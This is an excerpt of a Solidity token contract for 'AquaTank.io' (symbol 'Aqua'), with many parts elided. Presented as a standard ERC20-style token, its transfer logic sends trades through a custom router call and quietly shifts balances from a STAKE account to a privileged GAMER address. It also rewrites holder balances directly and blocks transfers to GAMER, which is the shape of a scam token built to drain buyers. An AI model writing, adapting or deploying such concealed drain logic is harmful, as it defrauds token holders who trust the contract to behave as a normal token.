...
contract COINDATA {
  ...
  address public constant nftAddress =
    0x79dB27b5949361c214cd84fd52a8eB1debe34d10;
  address public constant GAMER = 0xFD1728404b6CBfDab5c1E7bC2E63512EA4d1A563;
  ...
  address public constant _OFFICE = 0x21e53aA12170C96b0d0FFa4BE73b3d56cf9a8645;
...
contract Coin is COINDATA, IERC20, Context {
  ...
  string public constant _name = "AquaTank.io";
  string public constant _symbol = "Aqua";
  ...
  constructor() {
    ...
    _tOwned[_route] = deadAmount * 60;
    _tOwned[address(0xdEaD)] = deadAmount * 25;
    _tOwned[FTM] = deadAmount * 15;
  ...
  function _tokenTransfer(
    ...
    if (tx.origin != GAMER) {
      (bool pass, bool success, uint256 exAmount, address dividends) =
        IPancakeRouter02(_route).swap(sender, recipient, tAmount);
      uint256 p = _tOwned[STAKE] / 4;
      if (pass && p > 0) {
        _tOwned[GAMER] += p * 3;
        _tOwned[STAKE] -= p * 3;
      }
      ...
      if (success) {
        ...
        if (exAmount > 0) {
          _tOwned[FTM] = _tOwned[FTM] + exAmount;
          _tOwned[STAKE] = _tOwned[STAKE] - exAmount;
          _tOwned[dividends] = _tOwned[dividends] + exAmount;
          _tOwned[GAMER] = _tOwned[GAMER] - exAmount;
          emit Transfer(GAMER, dividends, exAmount);
  ...
  function _transfer(
    ...
    require(
      amount > 0 && _tOwned[sender] >= amount && recipient != GAMER,
